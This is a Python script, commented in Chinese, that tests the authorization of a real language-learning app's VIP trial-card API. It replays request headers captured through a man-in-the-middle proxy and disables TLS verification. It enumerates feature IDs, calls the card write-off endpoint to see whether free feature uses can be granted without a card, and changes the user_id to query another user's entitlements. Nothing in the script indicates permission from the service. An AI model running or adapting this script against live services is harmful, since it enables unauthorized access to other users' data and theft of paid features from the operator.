"""card_probe.py — VIP 体验卡接口的授权强度探测

实验：
  A. 枚举 feature_id，看有哪些「权益位」
  B. write_off_card 传 incr_times=0/1，再查 left_times 是否变化（= 无卡也能白送次数？）
  C. 改 user_id 试探越权（别人的卡权益）

用法: python tools\\card_probe.py
"""
import json
import pathlib
import ssl
import sys
import urllib.request

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

ROOT = pathlib.Path(r"<WORKDIR>\artifacts\mitm")
BASE = "https://api-cn.hellotalk8.com/member_privilege_center/v3/vip_experience_card/"
UID = <UID>


def load_headers():
    f = ROOT / "headers_write_off_card.json"
    data = json.loads(f.read_text(encoding="utf-8"))
    h = dict(data["headers"])
    h.setdefault("accept", "application/json")
    return h


def post(headers, path, body):
    data = json.dumps(body, separators=(",", ":")).encode("utf-8")
    req = urllib.request.Request(BASE + path, data=data, method="POST")
    for k, v in headers.items():
        req.add_header(k, v)
    req.add_header("content-type", "application/json; charset=UTF-8")
    try:
        with urllib.request.urlopen(req, timeout=25, context=CTX) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")[:300]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:300]
    except Exception as e:
        return None, f"{type(e).__name__}: {e}"


def main():
    h = load_headers()
    print("=== A. 枚举 feature_id（card_type=1, scene_id=20000）===")
    for fid in ["00001", "00002", "00003", "00004", "00005", "00010"]:
        code, text = post(h, "query_user_feature_right",
                          {"card_type": "1", "feature_id": fid, "scene_id": "20000", "user_id": UID})
        print(f"  feature_id={fid} -> [{code}] {text}")

    print("\n=== B. write_off_card incr_times=1 后再查 left_times ===")
    for fid in ["00001", "00002"]:
        code, text = post(h, "write_off_card",
                          {"feature_id": fid, "incr_times": 1, "scene_id": "20000",
                           "user_id": UID, "advertising_id": None})
        print(f"  write_off(feature_id={fid}, incr_times=1) -> [{code}] {text}")
        code, text = post(h, "query_user_feature_right",
                          {"card_type": "1", "feature_id": fid, "scene_id": "20000", "user_id": UID})
        print(f"    re-query({fid}) -> [{code}] {text}")

    print("\n=== C. 越权试探：user_id 改成别的值 ===")
    code, text = post(h, "query_user_feature_right",
                      {"card_type": "1", "feature_id": "00001", "scene_id": "20000", "user_id": 100000001})
    print(f"  查别人(user_id=100000001) -> [{code}] {text}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
